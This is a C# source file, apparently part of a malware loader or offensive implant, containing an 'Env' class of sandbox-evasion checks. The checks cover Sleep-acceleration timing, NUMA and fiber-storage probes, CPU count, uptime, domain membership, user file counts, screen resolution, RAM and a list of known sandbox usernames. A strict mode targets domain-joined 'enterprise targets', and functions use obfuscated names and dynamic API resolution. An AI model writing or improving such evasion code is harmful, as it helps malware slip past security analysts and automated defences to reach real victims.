using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace SvcUtil
{
    internal static class Env
    {
        /// <summary>
        /// Run all environment checks.
        /// Returns false if any check indicates a sandbox/analysis environment.
        /// </summary>
        public static bool Go()
        {
            return C1()
                && C2()
                && C3()
                && C4()
                && C5()
                && C6()
                && C7()
                && C8()
                && C9();
        }

        // ── Existing checks ────────────────────────────────────────

        /// <summary>
        /// Verify timing consistency (Sleep acceleration detection).
        /// Sandboxes often fast-forward Sleep calls.
        /// </summary>
        public static bool C1()
        {
            ulong t1 = W.MH();
            Thread.Sleep(2000);
            ulong t2 = W.MH();
            return (t2 - t1) >= 1900;
        }

        /// <summary>
        /// Check NUMA allocation support.
        /// Many sandboxes lack proper NUMA implementation.
        /// </summary>
        public static bool C2()
        {
            IntPtr result = W.ME(
                W.M6(),
                IntPtr.Zero,
                (UIntPtr)0x1000,         // 4 KB
                0x3000,                  // MEM_COMMIT | MEM_RESERVE
                0x04,                    // PAGE_READWRITE
                0);                      // NUMA node 0

            if (result == IntPtr.Zero)
                return false;

            // Clean up the test allocation
            W.MD(result, UIntPtr.Zero, 0x8000); // MEM_RELEASE
            return true;
        }

        /// <summary>
        /// Check FLS (Fiber Local Storage) support.
        /// </summary>
        public static bool C3()
        {
            uint idx = W.MF(IntPtr.Zero);
            if (idx == 0xFFFFFFFF) // FLS_OUT_OF_INDEXES
                return false;

            W.MG(idx);
            return true;
        }

        /// <summary>
        /// Check processor count (≥ 2).
        /// Most sandboxes run with 1 vCPU.
        /// </summary>
        public static bool C4()
        {
            return Environment.ProcessorCount >= 2;
        }

        /// <summary>
        /// Check system uptime (> 10 minutes).
        /// Fresh sandbox VMs have very low uptime.
        /// </summary>
        public static bool C5()
        {
            ulong uptime = W.MH();
            return uptime > 600000; // 10 minutes in milliseconds
        }

        // ── New checks ─────────────────────────────────────────────

        /// <summary>
        /// Check for domain-joined machine.
        /// Most enterprise targets are domain-joined; sandboxes typically are not.
        /// Uses USERDNSDOMAIN environment variable as a lightweight check
        /// without P/Invoke.
        /// </summary>
        public static bool C6()
        {
            try
            {
                // USERDNSDOMAIN is set on domain-joined machines when
                // the user is logged in with a domain account
                string dnsDomain = Environment.GetEnvironmentVariable("USERDNSDOMAIN");
                if (!string.IsNullOrEmpty(dnsDomain))
                    return true;

                // Fallback: check LOGONSERVER — domain machines have
                // \\DCNAME, standalone have \\COMPUTERNAME
                string logonServer = Environment.GetEnvironmentVariable("LOGONSERVER");
                string computerName = Environment.GetEnvironmentVariable("COMPUTERNAME");

                if (!string.IsNullOrEmpty(logonServer) &&
                    !string.IsNullOrEmpty(computerName))
                {
                    string serverName = logonServer.TrimStart('\\');
                    // If logon server differs from computer name,
                    // we're likely on a domain
                    if (!serverName.Equals(computerName,
                            StringComparison.OrdinalIgnoreCase))
                        return true;
                }

                // Not domain-joined — could be a sandbox or a standalone workstation.
                // We don't fail hard here; just add it as a signal.
                // Return true to not block on non-domain machines entirely.
                // The caller can use GoStrict() if domain membership is required.
                return true;
            }
            catch
            {
                return true; // Don't block on exception
            }
        }

        /// <summary>
        /// Check for recent user files in common locations.
        /// Real user machines have documents, downloads, desktop files.
        /// Sandboxes have near-empty user profiles.
        /// </summary>
        public static bool C7()
        {
            try
            {
                int fileCount = 0;

                string[] checkPaths = new string[]
                {
                    Environment.GetFolderPath(Environment.SpecialFolder.Recent),
                    Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                    Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)
                };

                foreach (string path in checkPaths)
                {
                    if (string.IsNullOrEmpty(path) || !Directory.Exists(path))
                        continue;

                    try
                    {
                        string[] files = Directory.GetFiles(path);
                        fileCount += files.Length;
                    }
                    catch
                    {
                        // Access denied is fine — it means the folder exists
                        // with real permissions, not a sandbox stub
                        fileCount++;
                    }

                    if (fileCount >= 5)
                        return true;
                }

                // Also check if Recent folder has any .lnk files
                // (shortcut files from recently opened documents)
                string recent = Environment.GetFolderPath(
                    Environment.SpecialFolder.Recent);
                if (!string.IsNullOrEmpty(recent) && Directory.Exists(recent))
                {
                    try
                    {
                        string[] lnkFiles = Directory.GetFiles(recent, "*.lnk");
                        if (lnkFiles.Length >= 3)
                            return true;
                    }
                    catch { }
                }

                // Very few files — suspicious but not conclusive.
                // Fresh installs or kiosk machines can be sparse too.
                return fileCount >= 2;
            }
            catch
            {
                return true;
            }
        }

        /// <summary>
        /// Check screen resolution.
        /// Sandboxes often use low or default resolutions like 1024x768.
        /// Resolves GetSystemMetrics dynamically.
        /// SM_CXSCREEN = 0, SM_CYSCREEN = 1
        /// </summary>
        public static bool C8()
        {
            try
            {
                IntPtr hUser32 = W.M0("user32.dll");
                if (hUser32 == IntPtr.Zero)
                    return true; // No user32 = headless/server, don't block

                IntPtr pFunc = W.M1(hUser32, "GetSystemMetrics");
                if (pFunc == IntPtr.Zero)
                    return true;

                var gsm = (DGetSystemMetrics)
                    Marshal.GetDelegateForFunctionPointer(
                        pFunc, typeof(DGetSystemMetrics));

                int cx = gsm(0);  // SM_CXSCREEN
                int cy = gsm(1);  // SM_CYSCREEN

                // Most real machines have at least 1280x720
                // Common sandbox resolutions: 800x600, 1024x768
                if (cx >= 1280 && cy >= 720)
                    return true;

                // If we can't get metrics (headless/RDP), don't block
                if (cx == 0 && cy == 0)
                    return true;

                return false;
            }
            catch
            {
                return true;
            }
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int DGetSystemMetrics(int nIndex);

        /// <summary>
        /// Check for suspicious usernames commonly used by sandboxes.
        /// </summary>
        public static bool C9()
        {
            try
            {
                string user = Environment.UserName;
                if (string.IsNullOrEmpty(user))
                    return false;

                string lower = user.ToLowerInvariant();

                // Known sandbox/analysis usernames
                string[] suspicious = new string[]
                {
                    "sandbox", "malware", "virus", "sample",
                    "test", "admin", "user", "analyst",
                    "currentuser", "cuckoo", "joe", "john doe",
                    "peter wilson", "milozs", "hong lee",
                    "johnson", "emily", "hapubws"
                };

                // Exact match for short common words to avoid false positives
                // (e.g., "contest" contains "test", "joey" contains "joe")
                string[] exactOnly = { "test", "admin", "user", "joe" };
                foreach (string s in suspicious)
                {
                    if (lower == s)
                        return false;

                    // Only use Contains for longer, distinctive strings
                    bool isExactOnly = false;
                    foreach (string e in exactOnly)
                        if (s == e) { isExactOnly = true; break; }

                    if (!isExactOnly && lower.Contains(s))
                        return false;
                }

                // Check for auto-generated names (all digits, very short)
                if (user.Length <= 3)
                    return false;

                return true;
            }
            catch
            {
                return true;
            }
        }

        // ── Strict mode (all checks must pass including domain) ────

        /// <summary>
        /// Strict environment check — requires domain-joined machine.
        /// Use for targeted operations where you know the target is
        /// in an Active Directory environment.
        /// </summary>
        public static bool GoStrict()
        {
            if (!Go())
                return false;

            // Additionally require domain membership
            string dnsDomain = Environment.GetEnvironmentVariable("USERDNSDOMAIN");
            return !string.IsNullOrEmpty(dnsDomain);
        }

        /// <summary>
        /// Get total physical memory in MB.
        /// Useful as an additional check — sandboxes often have &lt; 2GB RAM.
        /// Call separately as this requires WMI or GlobalMemoryStatusEx.
        /// </summary>
        public static bool CheckMemory(uint minMegabytes = 2048)
        {
            try
            {
                // Use GlobalMemoryStatusEx via D/Invoke
                // MEMORYSTATUSEX struct is 64 bytes
                IntPtr pMs = Marshal.AllocHGlobal(64);
                try
                {
                    Marshal.WriteInt32(pMs, 64); // dwLength

                    IntPtr hK32 = W.M0("kernel32.dll");
                    if (hK32 == IntPtr.Zero) return true;

                    IntPtr pFunc = W.M1(hK32, "GlobalMemoryStatusEx");
                    if (pFunc == IntPtr.Zero) return true;

                    var del = (DGlobalMemoryStatusEx)
                        Marshal.GetDelegateForFunctionPointer(
                            pFunc, typeof(DGlobalMemoryStatusEx));

                    if (!del(pMs))
                        return true;

                    // ullTotalPhys at offset 8 (uint64)
                    ulong totalBytes = (ulong)Marshal.ReadInt64(pMs, 8);
                    ulong totalMB = totalBytes / (1024 * 1024);

                    return totalMB >= minMegabytes;
                }
                finally
                {
                    Marshal.FreeHGlobal(pMs);
                }
            }
            catch
            {
                return true;
            }
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool DGlobalMemoryStatusEx(IntPtr lpBuffer);
    }
}
